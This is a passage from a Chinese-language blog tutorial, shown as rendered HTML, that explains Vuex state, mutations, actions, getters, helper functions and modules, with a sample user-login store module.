class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">  router,</span><br><span class="line">  store,   <span class="comment">// ***</span></span><br><span class="line">  <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="state状态管理数据"><a class="markdownIt-Anchor" href="#state状态管理数据">#</a> state 状态管理数据</h3><p>我们通常将需要进行管理的共享数据，放入 state 中，使其形似为全局变量，对于需要的组件进行引入该 state 状态数据。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> state = &#123;</span><br><span class="line">  userId: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  token: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  name: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  avatar: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  introduction: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  roles: [],</span><br><span class="line">  tenantId: <span class="number">1</span>,</span><br><span class="line">  userInfo: <span class="literal">null</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="mutations-同步提交数据"><a class="markdownIt-Anchor" href="#mutations-同步提交数据">#</a> mutations 同步提交数据</h3><p>mutations 用于更改 state 中的状态逻辑的，且为同步更改 state 中的状态数据。<br>需要知道的是在 vuex 中只能通过 mutation 来去修改 state 对象，<br>可以通过获取 actions 获取到的数据去修改 state, 也可以在 mutations 模块中直接定义方法来去更改状态数据。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mutations = &#123;</span><br><span class="line">  <span class="attr">SET_TOKEN</span>: <span class="function">(<span class="params">state, token</span>) =&gt;</span> &#123;</span><br><span class="line">    state.<span class="property">token</span> = token;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">SET_USERID</span>: <span class="function">(<span class="params">state, userId</span>) =&gt;</span> &#123;</span><br><span class="line">    state.<span class="property">userId</span> = userId;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">SET_NAME</span>: <span class="function">(<span class="params">state, name</span>) =&gt;</span> &#123;</span><br><span class="line">    state.<span class="property">name</span> = name;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">SET_ROLES</span>: <span class="function">(<span class="params">state, roles</span>) =&gt;</span> &#123;</span><br><span class="line">    state.<span class="property">roles</span> = roles;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">SET_TENANTID</span>: <span class="function">(<span class="params">state, roles</span>) =&gt;</span> &#123;</span><br><span class="line">    state.<span class="property">tenantId</span> = roles;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">SET_USER_INFO</span>: <span class="function">(<span class="params">state, userInfo</span>) =&gt;</span> &#123;</span><br><span class="line">    state.<span class="property">userInfo</span> = userInfo;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>通过 mutations 和下面的 actions 模块，大家也可以看出 commit 是用于调用 mutation 模块中的。<br>在组件中调用其 mutation 模块的代码为：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.$store.commit(<span class="string">&#x27;SET_TOKEN&#x27;</span>, token_data) </span><br></pre></td></tr></table></figure><h3 id="actions-的异步操作"><a class="markdownIt-Anchor" href="#actions-的异步操作">#</a> actions 的异步操作</h3><p>actions 与其 mutations 类似，但其可以进行异步操作，<br>且将异步操作获取的数据提交给 mutations，使得 mutations 更改 state 中的状态数据，这里常常用于获取 ajax 请求中的数据 (因为是异步)，并将其获取的数据 commit 提交给 mutations 使得 state 数据状态的更新。</p><blockquote><p>和 mutations 的不同之处在于：</p><ol><li>Action 提交的是 mutation，而不是直接变更状态。</li><li>Action 可以包含任意异步操作。</li></ol></blockquote><p>举例</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 下面就是通过actions执行异步Ajax请求，</span></span><br><span class="line"><span class="comment">得到数据后，</span></span><br><span class="line"><span class="comment">通过commit的方法调用mutations 从而更新数据</span></span><br><span class="line"><span class="comment">例如：  commit(&#x27;SET_TOKEN&#x27;, data.uuid);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> actions = &#123;</span><br><span class="line">  login(&#123; commit &#125;, userInfo) &#123;  <span class="comment">// 用户登录</span></span><br><span class="line">    <span class="keyword">const</span> params = userInfo;</span><br><span class="line">    params.userName = userInfo.userName.trim()</span><br><span class="line">    <span class="keyword">return</span> new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">      getLogin(params)</span><br><span class="line">        .then((response) =&gt; &#123;</span><br><span class="line">          <span class="keyword">const</span> &#123; status, message, <span class="keyword">data</span> &#125; = response || &#123;&#125;;</span><br><span class="line">          <span class="keyword">if</span> (status === <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="comment">// 存入 参数： 1.调用的值 2.所要存入的数据</span></span><br><span class="line">            commit(<span class="string">&#x27;SET_USER_INFO&#x27;</span>, <span class="keyword">data</span>);</span><br><span class="line">            commit(<span class="string">&#x27;SET_TOKEN&#x27;</span>, <span class="keyword">data</span>.uuid);</span><br><span class="line">            commit(<span class="string">&#x27;SET_USERID&#x27;</span>, <span class="keyword">data</span>.id);</span><br><span class="line">            commit(<span class="string">&#x27;SET_ROLES&#x27;</span>, <span class="keyword">data</span>.roles);</span><br><span class="line">            commit(<span class="string">&#x27;SET_NAME&#x27;</span>, <span class="keyword">data</span>.realName);</span><br><span class="line">            commit(<span class="string">&#x27;SET_TENANTID&#x27;</span>, <span class="keyword">data</span>.tenantId || <span class="number">1</span>);</span><br><span class="line">            setToken(<span class="keyword">data</span>.uuid);</span><br><span class="line">            db.save(<span class="string">&#x27;userInfo&#x27;</span>, <span class="keyword">data</span>);</span><br><span class="line">            db.save(<span class="string">&#x27;tenantId&#x27;</span>, <span class="keyword">data</span>.tenantId || <span class="number">1</span>);</span><br><span class="line">            localStorage.setItem(<span class="string">&#x27;loginToken&#x27;</span>, <span class="keyword">data</span>.uuid);</span><br><span class="line">            resolve(<span class="keyword">data</span>);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// ElementUI.Message.error(message);  // axios拦截统一提示了</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="keyword">catch</span>((error) =&gt; &#123;</span><br><span class="line">          <span class="comment">// ElementUI.Message.error(error.message); // axios拦截统一提示了</span></span><br><span class="line">          reject(error);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个 actions 在组件中的调用方法就是：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">dispatch</span>(<span class="string">&#x27;user/login&#x27;</span>, postUser)</span><br><span class="line">            .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">               <span class="comment">// .............</span></span><br><span class="line">              &#125;)</span><br><span class="line"><span class="comment">// 我这里的login方法写在了user.js这个module里 所以这里调用是 user/login</span></span><br><span class="line"><span class="comment">// 下面会讲到module</span></span><br></pre></td></tr></table></figure><h3 id="getters-对state进行加工"><a class="markdownIt-Anchor" href="#getters-对state进行加工">#</a> Getters 对 state 进行加工</h3><p>Getters 相当于 computed 计算属性，用于加工处理 state 状态数据，有其两个默认参数，第一个默认参数为 state，第二个默认参数为 getters。</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getters=&#123;</span><br><span class="line">  plusCount(state)&#123;</span><br><span class="line">    <span class="keyword">return</span> state.count + <span class="number">1</span></span><br><span class="line">  &#125;,</span><br><span class="line"> <span class="comment">//获取state中状态数据对象，和获取getters模块中plusCount数据</span></span><br><span class="line">  totalCount(state,getters)&#123;</span><br><span class="line">    <span class="keyword">return</span> getters.plusCount + state.count</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在组件中调用该方法的代码片段为：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.$store.getters.totalCount()</span><br></pre></td></tr></table></figure><h3 id="在vue组件中获得vuex状态"><a class="markdownIt-Anchor" href="#在vue组件中获得vuex状态">#</a> 在 Vue 组件中获得 Vuex 状态</h3><p>从 <code>store</code>  实例中读取状态最简单的方法就是在计算属性中返回某个状态，由于 <code>Vuex</code>  的状态存储是响应式的，所以在这里每当 <code>store.state.count</code>  变化的时候，都会重新求取计算属性，进行响应式更新。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">computed: &#123;</span><br><span class="line">       count: <span class="built_in">function</span>()&#123;</span><br><span class="line">           return this.$store<span class="selector-class">.state</span><span class="selector-class">.count</span></span><br><span class="line">       &#125;</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure><p>那么对于以上的 store 我们就简单介绍完了，相信大家看完后对于 vuex 会有一定的理解。那么这个时候我们要想，是不是使用 <code>this.$store.state</code>  或 <code>this.$store.getters.xxx</code>  感到麻烦呢？下面我们介绍另一种引入 state 和 getters 的方式</p><h3 id="辅助函数-mapstate-和-mapgetters"><a class="markdownIt-Anchor" href="#辅助函数-mapstate-和-mapgetters">#</a> 辅助函数 mapState 和 mapGetters</h3><p>对于上述的在组件中引用 state 和 getters 的方法是不是感到麻烦呢？使用 mapState 你将会感受到便利。<br>组件中这样使用</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//首先我们需要先将辅助函数引入</span></span><br><span class="line"><span class="keyword">import</span> &#123; mapGetters,mapState &#125; <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line"> <span class="attr">computed</span>: &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 使用对象展开运算符将 getter 混入 computed 对象中</span></span><br><span class="line">  ...<span class="title function_">mapGetters</span>( [<span class="string">&#x27;plusCount&#x27;</span>,<span class="string">&#x27;totalCount&#x27;</span>] )</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 使用对象展开运算符将 state 混入 computed 对象中</span></span><br><span class="line">    ...<span class="title function_">mapState</span>( [<span class="string">&#x27;userInfo&#x27;</span>,<span class="string">&#x27;count&#x27;</span>] )</span><br><span class="line"></span><br><span class="line"> &#125;,</span><br><span class="line"><span class="attr">methods</span>:&#123;</span><br><span class="line">    <span class="title function_">getData</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// 这里就能直接使用了  直接使用state 和getters里的数据</span></span><br><span class="line">        <span class="comment">//  this.userInfo </span></span><br><span class="line">        <span class="comment">// this.plusCount</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="module子模块化管理"><a class="markdownIt-Anchor" href="#module子模块化管理">#</a> Module 子模块化管理</h3><p>store 文件夹下的 index.js 代码如下</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vuex</span> <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"><span class="keyword">import</span> getters <span class="keyword">from</span> <span class="string">&#x27;./getters&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Vuex</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> modulesFiles = <span class="built_in">require</span>.<span class="title function_">context</span>(<span class="string">&#x27;./modules&#x27;</span>, <span class="literal">true</span>, <span class="regexp">/\.js$/</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> modules = modulesFiles.<span class="title function_">keys</span>().<span class="title function_">reduce</span>(<span class="function">(<span class="params">modules, modulePath</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> moduleName = modulePath.<span class="title function_">replace</span>(<span class="regexp">/^\.\/(.*)\.\w+$/</span>, <span class="string">&#x27;$1&#x27;</span>)</span><br><span class="line">  <span class="keyword">const</span> value = <span class="title function_">modulesFiles</span>(modulePath)</span><br><span class="line">  modules[moduleName] = value.<span class="property">default</span></span><br><span class="line">  <span class="keyword">return</span> modules</span><br><span class="line">&#125;, &#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">  modules,</span><br><span class="line">  getters</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store</span><br></pre></td></tr></table></figure><p>文件目录如图</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202203070933394.webp" alt="img"></p><p>举例 api.js</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; getKey, getLogin, logout, getInfo &#125; <span class="keyword">from</span> <span class="string">&#x27;@/api/user&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; setToken, removeToken &#125; <span class="keyword">from</span> <span class="string">&#x27;@/utils/auth&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> db <span class="keyword">from</span> <span class="string">&#x27;@/utils/localstorage&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> router, &#123; resetRouter &#125; <span class="keyword">from</span> <span class="string">&#x27;@/router&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ElementUI</span> <span class="keyword">from</span> <span class="string">&#x27;element-ui&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> state = &#123;</span><br><span class="line">  <span class="attr">userId</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="attr">token</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="attr">avatar</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="attr">introduction</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="attr">roles</span>: [],</span><br><span class="line">  <span class="attr">tenantId</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">userInfo</span>: <span class="literal">null</span></span><br><span class="line">  <span class="comment">// roles: [&#x27;9999&#x27;]</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> mutations = &#123;</span><br><span class="line">  <span class="attr">SET_TOKEN</span>: <span class="function">(<span class="params">state, token</span>) =&gt;</span> &#123;</span><br><span class="line">    state.<span class="property">token</span> = token;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">SET_USERID</span>: <span class="function">(<span class="params">state, userId</span>) =&gt;</span> &#123;</span><br><span class="line">    state.<span class="property">userId</span> = userId;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">SET_NAME</span>: <span class="function">(<span class="params">state, name</span>) =&gt;</span> &#123;</span><br><span class="line">    state.<span class="property">name</span> = name;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">SET_ROLES</span>: <span class="function">(<span class="params">state, roles</span>) =&gt;</span> &#123;</span><br><span class="line">    state.<span class="property">roles</span> = roles;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">SET_TENANTID</span>: <span class="function">(<span class="params">state, roles</span>) =&gt;</span> &#123;</span><br><span class="line">    state.<span class="property">tenantId</span> = roles;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">SET_USER_INFO</span>: <span class="function">(<span class="params">state, userInfo</span>) =&gt;</span> &#123;</span><br><span class="line">    state.<span class="property">userInfo</span> = userInfo;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> actions = &#123;</span><br><span class="line">  <span class="comment">// 获取密钥</span></span><br><span class="line">  <span class="title function_">getKey</span>(<span class="params">&#123; commit &#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">getKey</span>()</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="title function_">resolve</span>(response);</span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="title function_">reject</span>(error);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 用户登录</span></span><br><span class="line">  <span class="title function_">login</span>(<span class="params">&#123; commit &#125;, userInfo</span>) &#123;</span><br><span class="line">    <span class="comment">// const &#123; username, password &#125; = userInfo;</span></span><br><span class="line">    <span class="keyword">const</span> params = userInfo;</span><br><span class="line">    params.<span class="property">userName</span> = userInfo.<span class="property">userName</span>.<span class="title function_">trim</span>()</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// console.log(username, password);</span></span><br><span class="line">      <span class="comment">// setToken(state.token)</span></span><br><span class="line">      <span class="comment">// localStorage.setItem(&#x27;loginToken&#x27;, state.token)</span></span><br><span class="line">      <span class="title function_">getLogin</span>(params)</span><br><span class="line">      <span class="comment">// getLogin(&#123; userName: username.trim(), password: password &#125;)</span></span><br><span class="line">        .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> &#123; status, message, data &#125; = response || &#123;&#125;;</span><br><span class="line">          <span class="keyword">if</span> (status === <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="comment">// 存入 参数： 1.调用的值 2.所要存入的数据</span></span><br><span class="line">            <span class="title function_">commit</span>(<span class="string">&#x27;SET_USER_INFO&#x27;</span>, data);</span><br><span class="line">            <span class="title function_">commit</span>(<span class="string">&#x27;SET_TOKEN&#x27;</span>, data.<span class="property">uuid</span>);</span><br><span class="line">            <span class="title function_">commit</span>(<span class="string">&#x27;SET_USERID&#x27;</span>, data.<span class="property">id</span>);</span><br><span class="line">            <span class="title function_">commit</span>(<span class="string">&#x27;SET_ROLES&#x27;</span>, data.<span class="property">roles</span>);</span><br><span class="line">            <span class="title function_">commit</span>(<span class="string">&#x27;SET_NAME&#x27;</span>, data.<span class="property">realName</span>);</span><br><span class="line">            <span class="title function_">commit</span>(<span class="string">&#x27;SET_TENANTID&#x27;</span>, data.<span class="property">tenantId</span> || <span class="number">1</span>);</span><br><span class="line">            <span class="title function_">setToken</span>(data.<span class="property">uuid</span>);</span><br><span class="line">            db.<span class="title function_">save</span>(<span class="string">&#x27;userInfo&#x27;</span>, data);</span><br><span class="line">            db.<span class="title function_">save</span>(<span class="string">&#x27;tenantId&#x27;</span>, data.<span class="property">tenantId</span> || <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;loginToken&#x27;</span>, data.<span class="property">uuid</span>);</span><br><span class="line">            <span class="title function_">resolve</span>(data);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// ElementUI.Message.error(message);  // axios拦截统一提示了</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="comment">// ElementUI.Message.error(error.message); // axios拦截统一提示了</span></span><br><span class="line">          <span class="title function_">reject</span>(error);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取用户信息</span></span><br><span class="line">  <span class="title function_">getInfo</span>(<span class="params">&#123; commit, state &#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">getInfo</span>(state.<span class="property">token</span>)</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> &#123; data &#125; = response;</span><br><span class="line">          data.<span class="property">roles</span> = response.<span class="property">data</span>.<span class="property">rights</span>.<span class="title function_">map</span>(<span class="title class_">String</span>);</span><br><span class="line">          <span class="keyword">if</span> (!data) &#123;</span><br><span class="line">            <span class="title function_">reject</span>(<span class="string">&#x27;验证失败，请重新登录。&#x27;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">const</span> loginMessage = &#123;</span><br><span class="line">            <span class="attr">memberId</span>: data.<span class="property">id</span>,</span><br><span class="line">            <span class="attr">userName</span>: data.<span class="property">name</span>,</span><br><span class="line">            <span class="attr">userTel</span>: data.<span class="property">mobile</span>,</span><br><span class="line">            <span class="attr">realName</span>: data.<span class="property">realName</span>,</span><br><span class="line">            <span class="attr">incorCom</span>: data.<span class="property">incorCom</span>,</span><br><span class="line">            <span class="attr">virtualCor</span>: data.<span class="property">virtualCor</span>,</span><br><span class="line">            <span class="attr">deptId</span>: data.<span class="property">deptId</span>,</span><br><span class="line">            <span class="attr">deptpath</span>: data.<span class="property">deptpath</span>,</span><br><span class="line">            <span class="attr">deptName</span>: data.<span class="property">deptName</span></span><br><span class="line">          &#125;;</span><br><span class="line">          <span 